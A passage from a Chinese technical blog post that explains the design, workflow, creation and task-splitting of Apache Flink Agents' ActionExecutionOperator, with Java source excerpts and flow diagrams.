 * <span class="hljs-built_in">and</span> the resulting output <span class="hljs-keyword">event</span> <span class="hljs-built_in">is</span> collected <span class="hljs-keyword">for</span> further processing.
 */
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> ActionExecutionOperator&lt;<span class="hljs-keyword">IN</span>, OUT&gt; extends AbstractStreamOperator&lt;OUT&gt;
        <span class="hljs-keyword">implements</span> OneInputStreamOperator&lt;<span class="hljs-keyword">IN</span>, OUT&gt;, BoundedOneInput {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">1L</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final Logger LOG = LoggerFactory.getLogger(ActionExecutionOperator.<span class="hljs-keyword">class</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-type">String</span> RECOVERY_MARKER_STATE_NAME = <span class="hljs-string">"recoveryMarker"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-type">String</span> MESSAGE_SEQUENCE_NUMBER_STATE_NAME = <span class="hljs-string">"messageSequenceNumber"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-type">String</span> PENDING_INPUT_EVENT_STATE_NAME = <span class="hljs-string">"pendingInputEvents"</span>;

    <span class="hljs-keyword">private</span> final AgentPlan agentPlan;

    <span class="hljs-keyword">private</span> final <span class="hljs-type">Boolean</span> inputIsJava;

    <span class="hljs-keyword">private</span> transient StreamRecord&lt;OUT&gt; reusedStreamRecord;

    <span class="hljs-keyword">private</span> transient MapState&lt;<span class="hljs-type">String</span>, MemoryObjectImpl.MemoryItem&gt; shortTermMemState;

    // PythonActionExecutor <span class="hljs-keyword">for</span> Python actions
    <span class="hljs-keyword">private</span> transient PythonActionExecutor pythonActionExecutor;

    <span class="hljs-keyword">private</span> transient FlinkAgentsMetricGroupImpl metricGroup;

    <span class="hljs-keyword">private</span> transient BuiltInMetrics builtInMetrics;

    <span class="hljs-keyword">private</span> transient SegmentedQueue keySegmentQueue;

    <span class="hljs-keyword">private</span> final transient MailboxExecutor mailboxExecutor;

    // We need <span class="hljs-keyword">to</span> check whether the current thread <span class="hljs-built_in">is</span> the mailbox thread <span class="hljs-keyword">using</span> the mailbox
    // processor.
    // TODO: This <span class="hljs-built_in">is</span> a temporary workaround. <span class="hljs-keyword">In</span> the future, we should add an <span class="hljs-keyword">interface</span> <span class="hljs-keyword">in</span>
    // MailboxExecutor <span class="hljs-keyword">to</span> check whether a thread <span class="hljs-built_in">is</span> a mailbox thread, rather than <span class="hljs-keyword">using</span> reflection
    // <span class="hljs-keyword">to</span> obtain the MailboxProcessor instance <span class="hljs-built_in">and</span> make the determination.
    <span class="hljs-keyword">private</span> transient MailboxProcessor mailboxProcessor;

    // An action will be split <span class="hljs-keyword">into</span> one <span class="hljs-built_in">or</span> more ActionTask objects. We use a state <span class="hljs-keyword">to</span> store the
    // pending ActionTasks that are waiting <span class="hljs-keyword">to</span> be executed.
    <span class="hljs-keyword">private</span> transient ListState&lt;ActionTask&gt; actionTasksKState;

    // <span class="hljs-keyword">To</span> avoid processing different InputEvents <span class="hljs-keyword">with</span> the same <span class="hljs-keyword">key</span>, we use a state <span class="hljs-keyword">to</span> store pending
    // InputEvents that are waiting <span class="hljs-keyword">to</span> be processed.
    <span class="hljs-keyword">private</span> transient ListState&lt;<span class="hljs-keyword">Event</span>&gt; pendingInputEventsKState;

    // An <span class="hljs-keyword">operator</span> state <span class="hljs-built_in">is</span> used <span class="hljs-keyword">to</span> track the currently processing keys. This <span class="hljs-built_in">is</span> useful <span class="hljs-keyword">when</span>
    // receiving an EndOfInput signal, <span class="hljs-keyword">as</span> we need <span class="hljs-keyword">to</span> wait <span class="hljs-keyword">until</span> all related events are fully
    // processed.
    <span class="hljs-keyword">private</span> transient ListState&lt;<span class="hljs-type">Object</span>&gt; currentProcessingKeysOpState;

    <span class="hljs-keyword">private</span> final transient EventLogger eventLogger;
    <span class="hljs-keyword">private</span> final transient List&lt;EventListener&gt; eventListeners;

    <span class="hljs-keyword">private</span> transient ActionStateStore actionStateStore;
    <span class="hljs-keyword">private</span> transient ValueState&lt;<span class="hljs-type">Long</span>&gt; sequenceNumberKState;
    <span class="hljs-keyword">private</span> transient ListState&lt;<span class="hljs-type">Object</span>&gt; recoveryMarkerOpState;
    <span class="hljs-keyword">private</span> transient Map&lt;<span class="hljs-type">Long</span>, Map&lt;<span class="hljs-type">Object</span>, <span class="hljs-type">Long</span>&gt;&gt; checkpointIdToSeqNums;

    // This <span class="hljs-keyword">in</span> memory map keep track <span class="hljs-keyword">of</span> the runner context <span class="hljs-keyword">for</span> the <span class="hljs-keyword">async</span> action task that having
    // been finished
    <span class="hljs-keyword">private</span> final transient Map&lt;ActionTask, RunnerContextImpl&gt; actionTaskRunnerContexts;
</code></pre>
<h4 data-id="heading-5">1.3 关键设计</h4>
<p>ActionExecutionOperator 关键设计要点如下：</p>
<ul>
<li>状态管理：使用Flink的状态后端管理短期记忆和处理状态</li>
<li>异步支持：通过邮箱线程机制支持异步操作执行</li>
<li>容错恢复：通过checkpoint机制实现状态持久化和恢复</li>
<li>资源隔离：每个key拥有独立的处理上下文和状态</li>
<li>多语言支持：同时支持Java和Python实现的动作</li>
<li>这种设计使得复杂的Agent逻辑能够在Flink的分布式流处理环境中高效、可靠地执行</li>
</ul>
<h4 data-id="heading-6">1.4 流程</h4>
<p>ActionExecutionOperator 的工作流程：</p>
<ul>
<li>接收数据：从上游接收数据并包装成 InputEvent</li>
<li>动作触发：依据事件类型查找并触发相应的动作</li>
<li>动作执行：执行动作逻辑，可能产生新的事件</li>
<li>事件处理：处理动作产生的事件，如果是输入事件则发送给下游</li>
<li>状态更新：更新内存状态和执行状态</li>
<li>循环处理：继续处理新产生的事件，直到没有待处理的事件。</li>
</ul>
<p>关键特性：</p>
<ul>
<li>事件驱动：基于事件的处理模型，事件触发动作执行</li>
<li>状态一致性：通过Flink的状态管理来保证处理一致性</li>
<li>容错恢复：支持从检查点恢复执行状态</li>
<li>混合执行：同时支持 java 和 python 动作的执行</li>
<li>内存管理：管理Agent的短期内存状态</li>
</ul>
<p>使用流程图如下</p>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
	<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[AgentsExecutionEnvironment]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[RemoteExecutionEnvironment]</span>
	<span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[ActionExecutionOperator]</span>
	C --&gt; D<span class="hljs-selector-attr">[AgentPlan]</span>
	C --&gt; D<span class="hljs-selector-attr">[Flink State Backend]</span>
	C --&gt; D<span class="hljs-selector-attr">[Python Components]</span>
	C --&gt; D<span class="hljs-selector-attr">[Event Processing Components]</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1071b67850a6490094d8458c595692dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481060&amp;x-signature=d%2FsuEBKkkkWUjM1GsfLokg3E5tM%3D" alt="ActionExecutionOperator-flow-2" loading="lazy"/></p>
<p>ActionExecutionOperator-flow-2</p>
<h4 data-id="heading-7">1.5 组件 &amp; 关系</h4>
<p>ActionExecutionOperator 是 Flink Agent 系统中的核心执行组件，位于 Flink 流处理管道中，负责执行 Agent 定义的各种动作。其主要交互组件如下：</p>
<p><strong>上游组件</strong></p>
<ul>
<li>DataStream API：作为 Flink 流处理管道中的操作符，接收来自上游 DataStream 的数据</li>
<li>Input 数据源：接收各种类型的输入数据，将其包装为 InputEvent</li>
<li>KeyedStream：处理按键分组的数据流</li>
</ul>
<p><strong>下游组件</strong></p>
<ul>
<li>Output 数据接收器：将OutputEvent 中的数据发送到下游操作符</li>
<li>DataStream API：输出处理结果到下游 DataStream 操作符</li>
</ul>
<p><strong>核心依赖组件</strong></p>
<p>工作流程中的交互</p>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
	<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[DataStream Source]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[ActionExecutionOperator]</span>
	<span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[DataStream Sink]</span>
	<span class="hljs-selector-tag">B</span> --&gt; D<span class="hljs-selector-attr">[AgentPlan]</span>
	<span class="hljs-selector-tag">B</span> --&gt; E<span class="hljs-selector-attr">[ActionTask]</span>
	<span class="hljs-selector-tag">B</span> --&gt; F<span class="hljs-selector-attr">[RunnerContext]</span>
	<span class="hljs-selector-tag">B</span> --&gt; G<span class="hljs-selector-attr">[Flink State Backend]</span>
	<span class="hljs-selector-tag">B</span> --&gt; H<span class="hljs-selector-attr">[PythonActionExecutor]</span>
	<span class="hljs-selector-tag">B</span> --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[ActionStateStore]</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc5aa8d1e3bd4f97a22437c09ff7d720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768481060&amp;x-signature=eJqvLXpNUHEW4ocw6qLSeSLblzA%3D" alt="ActionExecutionOperatorflow-1" loading="lazy"/></p>
<p>ActionExecutionOperatorflow-1</p>
<h4 data-id="heading-8">1.6 核心依赖组件</h4>
<ul>
<li>
<p>AgentPlan：<strong>AgentPlan会被 ActionExecutionOperator 使用，因为操作符需要访问AgentPlan中的动作定义和资源配置来执行相应逻辑</strong></p>
<ul>
<li>包含Agent的所有动作定义和资源配置</li>
<li>提供动作触发逻辑和资源配置信息</li>
</ul>
</li>
<li>
<p>ActionTask 及其子类：</p>
<ul>
<li>JavaActionTask ：执行 Java 动作</li>
<li>PythonActionTask ：执行Python动作</li>
</ul>
</li>
<li>
<p>Environment</p>
<ul>
<li>Flink Streaming Runtime Environment：ActionExecutionOperator 是一个Flink 流处理操作符，会被 Flink 流处理运行时环境使用，作为流处理作业 DAG 图中的一个节点。</li>
<li>RemoteExecutionEnvironment：在远程执行环境中，RemoteExecutionEnvironment 会创建和使用 ActionExecutionOperator 来执行Agent 逻辑。</li>
</ul>
</li>
<li>
<p>RunnerContext 及其实现：</p>
<ul>
<li>RunnerContextImpl：Java 动作执行上下文</li>
<li>PythonRunnerContextImpl：Python 动作执行上下文</li>
</ul>
</li>
<li>
<p>状态管理组件。以下状态存储组件会被 ActionExecutionOperator 使用。</p>
<ul>
<li>Flink 状态后端，用于短期内存、待处理任务等。</li>
<li>ActionStateStore：KafkaActionStateStore：可选的外部状态存储，用于动作状态持久化和恢复。</li>
</ul>
</li>
<li>
<p>Python相关组件。当代理包含Python动作时，以下组件会与 ActionExecutionOperator 协同工作。</p>
<ul>
<li>PythonActionExecutor：管理Python环境和执行Python动作</li>
<li>PythonActionTask：表示Python动作任务</li>
<li>PythonRunnerContextImpl ：Python动作执行上下文。</li>
</ul>
</li>
<li>
<p>辅助组件</p>
<ul>
<li>EventLogger：事件日志记录器</li>
<li>EventListner：事件监听器</li>
<li>BultInMetrics：内置指标收集</li>
<li>FlinkAgentsMetricGroupImpl：指标组实现</li>
</ul>
</li>
<li>
<p>事件处理相关组件</p>
<ul>
<li>各种Event类型（InputEvent、OutputEvent、PythonEvent等）</li>
<li>SegmentedQueue：管理按键分段的事件队列和水印处理</li>
</ul>
</li>
</ul>
<h4 data-id="heading-9">1.7 主要功能</h4>
<p>ActionExecutionOperator 主要功能如下：</p>
<ul>
<li>
<p>动作执行核心</p>
<ul>
<li>执行Agent中定义的所有动作（actions）</li>
<li>处理事件驱动的执行流程，根据事件类型触发的相应的动作</li>
</ul>
</li>
<li>
<p>事件处理流程</p>
<ul>
<li>接收上游数据并将其包装成 InputEvent</li>
<li>根据事件类型触发对应的 action 执行</li>
<li>对应 OutputEvent 类型的事件，将数据发送到下游</li>
<li>对于其他类型的事件，继续触发相应的动作来执行</li>
</ul>
</li>
<li>
<p>状态管理</p>
<ul>
<li>管理短期内存状态（short-term memory）</li>
<li>维护动作执行状态和序列号</li>
<li>支持检查点和故障恢复</li>
<li>使用 Flink 状态后端持久化关键状态信息</li>
</ul>
</li>
<li>
<p>混合语言支持</p>
<ul>
<li>支持 Java 和 Python 两种语言编写的动作</li>
<li>通过 PythonActionExecutor 处理 Python 动作的执行</li>
<li>在同一个算子中协调 Java 和 Python 动作的执行</li>
</ul>
</li>
<li>
<p>异步处理支持</p>
<ul>
<li>支持异步动作执行</li>
<li>通过 MailboxExector 管理异步任务</li>
<li>处理长时间运行的动作任务</li>
</ul>
</li>
<li>
<p>监控和日志</p>
<ul>
<li>集成指标收集和监控</li>
<li>支持事件日志记录</li>
<li>提供内置指标跟踪执行情况</li>
</ul>
</li>
</ul>
<h4 data-id="heading-10">1.8 运行ActionTask流程</h4>
<p>ActionTask 在 Flink 中的运行机制分三步完成：创建、调度、执行，全程由 ActionExecutionOperator 托管，并利用 Flink 的邮箱线程保证并发安全，具体如下。</p>
<h5 data-id="heading-11">创建与初始化</h5>
<ul>
<li>作业启动时，ActionExecutionOperator 完成实例化，内部持有 AgentPlan（含全部 Action 定义）。</li>
<li>上游数据到达 processElement() 后，先被封装成 InputEvent；随后调用 processEvent() 开始处理。</li>
</ul>
<h5 data-id="heading-12">ActionTask 的创建与调度</h5>
<ul>
<li>
<p>processEvent() 通过 getActionsTriggeredBy() 找出响应该事件的所有 Action。</p>
</li>
<li>
<p>对每个 Action，调用 createActionTask() 生成对应的 ActionTask 实例，并存入 actionTasksState 状态。</p>
</li>
<li>
<p>使用 Flink MailboxExecutor 提交异步任务：</p>
<pre><code class="hljs language-scss" lang="scss">mailboxExecutor<span class="hljs-selector-class">.submit</span>(() -&gt; <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key), "process action task");
</code></pre>
<p>保证后续逻辑在 mailbox 线程中顺序执行，避免并发冲突。<strong>这是Agent与Flink进行结合的关键之一，是Agent代码运行的关键</strong>。</p>
</li>
</ul>
<h5 data-id="heading-13">ActionTask 的执行</h5>
<ul>
<li>
<p>tryProcessActionTaskForKey() → processActionTaskForKey() 从 actionTasksState 取出待处理任务。</p>
</li>
<li>
<p>createAndSetRunnerContext() 为任务绑定运行时上下文（内存、指标、邮箱检查等）。</p>
</li>
<li>
<p>调用 ActionTask.invoke() 执行具体动作逻辑；若任务返回新生成器（异步场景），则循环创建后续 ActionTask 并再次提交邮箱，实现“拆分-继续”流程。</p>
<ul>
<li>ActionTask.invoke() 返回 ActionTaskResult；若任务已完成（isFinished() 为 true），则通过 processEvent() 向下游发送输出事件或触发新的 ActionTask，并持久化内存状态。</li>
<li>若任务未完成（异步操作），则保存 RunnerContext 供后续使用，并将新生成的 ActionTask 加入 actionTasksState，再次提交到 MailboxExecutor，形成循环直到所有任务完成。</li>
</ul>
</li>
</ul>
<h5 data-id="heading-14">状态管理与容错</h5>
<ul>
<li>使用 Flink 状态后端持久化 actionTasksState、pendingInputEventsState 等；在 checkpoint 时保存快照，故障恢复后可继续执行。</li>
<li>实现 snapshotState() 和 initializeState() 方法，完成状态的快照与恢复。</li>
</ul>
<p>整个流程依托 Flink 核心特性：</p>
<ul>
<li>事件驱动：基于事件触发动作执行；</li>
<li>状态管理：使用 Flink 状态后端管理中间状态；</li>
<li>容错机制：通过 checkpoint 和状态恢复保证 exactly-once 语义；</li>
<li>异步处理：通过 MailboxExecutor 实现高效的异步任务调度；</li>
<li>键控处理：支持按键分区处理，保证同一键的数据顺序处理。</li>
</ul>
<p>通过“状态存储 + 邮箱调度”双机制，ActionTask 既能顺序处理单键事件，又能优雅拆分异步步骤，全程与 Flink 的并发模型无缝衔接。</p>
<h4 data-id="heading-15">1.8 Flink MailboxExecutor</h4>
<p>MailboxExecutor 是 Flink 内部的一个“单线程邮筒”调度器，作用可以一句话概括： <strong>“外部线程只管投信，内部让同一个算子/同一个键的所有任务按顺序一条一条执行，避免并发竞争，同时不阻塞整个 TaskManager”</strong> 。</p>
<h5 data-id="heading-16">为什么需要 MailboxExecutor</h5>
<ol>
<li>Flink 算子可能被多线程同时调用（网络线程、异步 I/O、用户回调）。</li>
<li>很多算子状态不是线程安全的（例如 keyed state、Python 解释器）。</li>
<li>不能把整个算子锁起来，否则背压会拖垮整个 TaskManager。</li>
</ol>
<p>→ 解决方案：把“真正干活”的代码投递到同一个“邮箱”里，由<strong>一条专用线程</strong>按顺序取出执行；其他线程只负责“投信”，瞬间返回，不会阻塞。</p>
<h5 data-id="heading-17">使用场景速览</h5>

























<table><thead><tr><th>场景</th><th>投递到邮箱的任务</th><th>好处</th></tr></thead><tbody><tr><td>ActionTask 拆分</td><td><code>tryProcessActionTaskForKey(key)</code></td><td>同一键的任务顺序执行，状态无锁</td></tr><tr><td>Python UDF 异步</td><td><code>PythonGeneratorActionTask</code></td><td>解释器单线程，避免 GIL 竞争</td></tr><tr><td>网络线程回调</td><td><code>onNext(record)</code></td><td>网络线程立即返回，不阻塞 TCP 接收</td></tr></tbody></table>
<h5 data-id="heading-18">工作模型（用邮筒来隐喻）</h5>
<pre><code class="hljs language-scss" lang="scss">任意线程（网络、异步、用户）  
   ├─→ mailbox<span class="hljs-selector-class">.put</span>(mail)   <span class="hljs-comment">// 非阻塞，瞬间返回  </span>
   └─→ 立即继续干别的  

专用单线程（Mailbox Thread）  
   ├─→ <span class="hljs-built_in">while</span>(true) mail = mailbox<span class="hljs-selector-class">.take</span>()  
   ├─→ 顺序执行 mail<span class="hljs-selector-class">.run</span>()  
   └─→ 更新状态、发下游、写 checkpoint
</code></pre>
<ul>
<li>邮箱使用 <strong>无锁队列</strong>（Disruptor），put/take 都是 O(1) 且线程安全。</li>
<li>单线程内部仍可异步（例如生成器返回新的 ActionTask），但<strong>状态读写无并发</strong>。</li>
</ul>
<p>对应示例如下：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 投递任务</span>
mailboxExecutor<span class="hljs-selector-class">.submit</span>(() -&gt; <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key), "process action task");

<span class="hljs-comment">// 邮箱线程循环（简化）</span>
while (isRunning) {
    Runnable task = mailbox<span class="hljs-selector-class">.take</span>();   <span class="hljs-comment">// 阻塞直到有信</span>
    task<span class="hljs-selector-class">.run</span>();                       <span class="hljs-comment">// 顺序执行</span>
}
</code></pre>
<h3 data-id="heading-19">0x02 ActionExecutionOperator 生成机制和策略</h3>
<h4 data-id="heading-20">2.1 生成位置</h4>
<p>ActionExecutionOperator 在 ActionExecutionOperatorFactory 类中创建。从代码结构可以看出，这个工厂类被用在 CompileUtils.connectToAgent() 方法中。</p>
<h4 data-id="heading-21">2.2 生成机制</h4>
<h5 data-id="heading-22">创建流程</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 在 CompileUtils.java 中
private <span class="hljs-keyword">static</span> <span class="hljs-operator">&lt;</span>K, <span class="hljs-keyword">IN</span>, <span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span> DataStream<span class="hljs-operator">&lt;</span><span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span> connectToAgent(
    KeyedStream<span class="hljs-operator">&lt;</span><span class="hljs-keyword">IN</span>, K<span class="hljs-operator">&gt;</span> keyedInputStream,
    AgentPlan agentPlan,
    TypeInformation<span class="hljs-operator">&lt;</span><span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span> outTypeInformation,
    <span class="hljs-type">boolean</span> inputIsJava) {
<span class="hljs-keyword">return</span> (DataStream<span class="hljs-operator">&lt;</span><span class="hljs-keyword">OUT</span><span class="hljs-operator">&gt;</span>)
    keyedInputStream
        .transform(
            "action-execute-operator",
            outTypeInformation,
            <span class="hljs-keyword">new</span> ActionExecutionOperatorFactory(agentPlan, inputIsJava)
        )
        .setParallelism(keyedInputStream.getParallelism());
}
</code></pre>
<p>操作符通过 Flink 的 transform() 方法创建，该方法接收一个 ActionExecutionOperatorFactory。</p>
<h5 data-id="heading-23">工厂模式实现</h5>
<p>ActionExecutionOperatorFactory 实现了 Flink 的 StreamOperatorFactory 接口：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ActionExecutionOperatorFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StreamOperatorFactory</span>&lt;<span class="hljs-title class_">Object</span>&gt; {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">AgentPlan</span> agentPlan;
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Boolean</span> inputIsJava;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">StreamOperator</span>&lt;<span class="hljs-title class_">Object</span>&gt;&gt; T <span class="hljs-title function_">createStreamOperator</span>(<span class="hljs-params">
        StreamOperatorParameters&lt;<span class="hljs-built_in">Object</span>&gt; parameters</span>) {
    <span class="hljs-title class_">ProcessingTimeService</span> processingTimeService = parameters.<span class="hljs-title function_">getProcessingTimeService</span>();
    <span class="hljs-title class_">MailboxExecutor</span> mailboxExecutor = parameters.<span class="hljs-title function_">getMailboxExecutor</span>();
    <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionExecutionOperator</span>&lt;&gt;(
            agentPlan,
            inputIsJava,
            processingTimeService,
            mailboxExecutor,
            <span class="hljs-literal">null</span>); <span class="hljs-comment">// actionStateStore</span>
}
</code></pre>
<h4 data-id="heading-24">2.3 关键生成策略</h4>
<h5 data-id="heading-25">策略 1：基于计划的生成</h5>
<ul>
<li>AgentPlan 包含关于动作、资源和配置的所有必要信息</li>
<li>这个计划是从用户定义的 Python 或 Java Agent 生成的</li>
<li>操作符的所有行为都在创建时由这个计划决定</li>
</ul>
<h5 data-id="heading-26">策略 2：类型特定处理</h5>
<p>inputIsJava 参数决定了如何处理输入数据：</p>
<ul>
<li>如果为 true：输入和输出是 Java 对象</li>
<li>如果为 false：输入和输出是字节数组（用于 Python 互操作）</li>
</ul>
<h5 data-id="heading-27">策略 3：资源管理</h5>
<p>资源在初始化期间注入到操作符中：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在 ActionExecutionOperator 构造函数中</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ActionExecutionOperator</span>(
        <span class="hljs-title class_">AgentPlan</span> agentPlan,
        <span class="hljs-title class_">Boolean</span> inputIsJava,
        <span class="hljs-title class_">ProcessingTimeService</span> processingTimeService,
        <span class="hljs-title class_">MailboxExecutor</span> mailboxExecutor,
        <span class="hljs-title class_">ActionStateStore</span> actionStateStore) {
    ...
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">StreamOperator</span>&lt;<span class="hljs-title class_">Object</span>&gt;&gt; T <span class="hljs-title function_">createStreamOperator</span>(<span class="hljs-params">
        StreamOperatorParameters&lt;<span class="hljs-built_in">Object</span>&gt; parameters</span>) {
    <span class="hljs-title class_">ProcessingTimeService</span> processingTimeService = parameters.<span class="hljs-title function_">getProcessingTimeService</span>();
    <span class="hljs-title class_">MailboxExecutor</span> mailboxExecutor = parameters.<span class="hljs-title function_">getMailboxExecutor</span>();
    <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionExecutionOperator</span>&lt;&gt;(
            agentPlan,
            inputIsJava,
            processingTimeService,
            mailboxExecutor,
            <span class="hljs-literal">null</span>); <span class="hljs-comment">// actionStateStore</span>
}
</code></pre>
<h4 data-id="heading-28">2.4 操作符初始化过程</h4>
<p>当操作符打开时。</p>
<p><strong>状态初始化：</strong></p>
<ul>
<li>短期记忆状态（<code>shortTermMemState</code>）</li>
<li>动作任务状态（<code>actionTasksState</code>）</li>
<li>待处理事件状态（<code>pendingInputEventsState</code>）</li>
<li>处理中的键跟踪状态（<code>currentProcessingKeysOpState</code>）</li>
</ul>
<p><strong>组件设置：</strong></p>
<ul>
<li>Python 执行器（如果需要）</li>
<li>指标收集</li>
<li>事件日志记录</li>
<li>动作状态存储（可选）</li>
</ul>
<p><strong>恢复逻辑：</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 故障/重启后恢复处理</span>
private void <span class="hljs-built_in">tryResumeProcessActionTasks</span>() throws Exception {
    Iterable&lt;<span class="hljs-selector-tag">Object</span>&gt; keys = currentProcessingKeysOpState<span class="hljs-selector-class">.get</span>();
    if (keys != null) {
        for (Object key : keys) {
            keySegmentQueue<span class="hljs-selector-class">.addKeyToLastSegment</span>(key);
            mailboxExecutor<span class="hljs-selector-class">.submit</span>(
                () -&gt; <span class="hljs-built_in">tryProcessActionTaskForKey</span>(key), "process action task");
        }
    }
}
</code></pre>
<h4 data-id="heading-29">2.5 与执行环境的集成</h4>
<p>本地环境和远程环境的生成过程不同：</p>
<p><strong>远程环境（Flink 集群）</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在 RemoteExecutionEnvironment.java 中</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">DataStream</span>&lt;<span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">toDataStream</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (agentPlan == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Must apply agent before calling toDataStream"</span>);
    }

    <span class="hljs-keyword">if</span> (outputDataStream == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (keySelector != <span class="hljs-literal">null</span>) {
            outputDataStream =
                <span class="hljs-title class_">CompileUtils</span>.<span class="hljs-title function_">connectToAgent</span>(inputDataStream, keySelector, agentPlan);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 如果没有提供键选择器，则使用简单的直键选择器</span>
            outputDataStream =
                <span class="hljs-title class_">CompileUtils</span>.<span class="hljs-title function_">connectToAgent</span>(inputDataStream, x -&gt; x, agentPlan);
        }
    }

    <span class="hljs-keyword">return</span> outputDataStream;
}
</code></pre>
<p><strong>本地环境</strong></p>
<p>对于本地执行，使用完全不同的 LocalRunner 而不是基于操作符的方法。</p>
<h4 data-id="heading-30">2.6 总结</h4>
<p>ActionExecutionOperator 通过 Flink 的转换 API 使用工厂模式生成。生成策略重点关注：</p>
<ul>
<li>声明式方法：使用 AgentPlan 定义行为</li>
<li>类型灵活性：通过序列化支持 Java 和 Python</li>
<li>状态管理：正确管理 Flink 状态以实现容错</li>
<li>资源注入：提供对已配置资源的访问</li>
<li>可恢复处理：通过状态快照支持故障恢复</li>
</ul>
<p>这种设计允许操作符基于代理定义动态创建，同时保持 Flink 流处理的保证。</p>
<h3 data-id="heading-31">0x03 任务拆分机制详解</h3>
<h4 data-id="heading-32">3.1 任务拆分的基本原理</h4>
<h5 data-id="heading-33">为什么需要拆分任务</h5>
<p>ActionExecutionOperator 将复杂的 Action 拆分成多个 ActionTask 的主要原因是为了支持异步操作和状态管理。</p>
<p>一个完整的 Action 可能包含以下复杂场景：</p>
<ul>
<li>需要等待外部服务响应的异步调用</li>
<li>需要分步骤执行的长时间运行任务</li>
<li>需要在不同时间点产生多个输出事件的任务</li>
</ul>
<h5 data-id="heading-34">拆分粒度</h5>
<p>每个 ActionTask 代表 Action 中的一个执行单元，通常对应以下情况之一：</p>
<ul>
<li>Action 的初始执行步骤</li>
<li>异步操作的触发和回调处理</li>
<li>长时间运行任务的阶段性执行</li>
</ul>
<h4 data-id="heading-35">3.2 任务创建过程</h4>
<h5 data-id="heading-36">不同类型 ActionTask 的创建</h5>
<p>根据 Action 的执行类型（Java 或 Python），创建相应的 ActionTask 实现：</p>
<ul>
<li>JavaActionTask：处理 Java 实现的 Action</li>
<li>PythonActionTask：处理 Python 实例的 Action</li>
</ul>
<h5 data-id="heading-37">动态创建 ActionTask</h5>
<p>在某些情况下，ActionTask.invoke() 可能会产生新的 ActionTask 来继续处理：</p>
<ul>
<li>异步操作完成后需要进一步处理结果</li>
<li>长时间运行的任务需要分阶段执行</li>
<li>需要等待某些条件满足后再继续执行</li>
</ul>
<p>具体对应代码中，就是当 ActionTask 被执行时，其 invoke() 方法可能会返回一个新的 ActionTask 来继续执行剩余的工作：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// PythonActionTask.invoke() 示例</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ActionTaskResult <span class="hljs-title">invoke</span>() throws Exception</span> {
    <span class="hljs-comment">// 执行 Python 函数</span>
    String pythonGeneratorRef = pythonActionExecutor.executePythonFunction(...);

    <span class="hljs-keyword">if</span> (pythonGeneratorRef != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 如果返回了生成器引用，创建新的 ActionTask 来处理后续步骤</span>
        ActionTask tempGeneratedActionTask =
            <span class="hljs-keyword">new</span> PythonGeneratorActionTask(key, <span class="hljs-keyword">event</span>, action, pythonGeneratorRef);
        tempGeneratedActionTask.setRunnerContext(runnerContext);
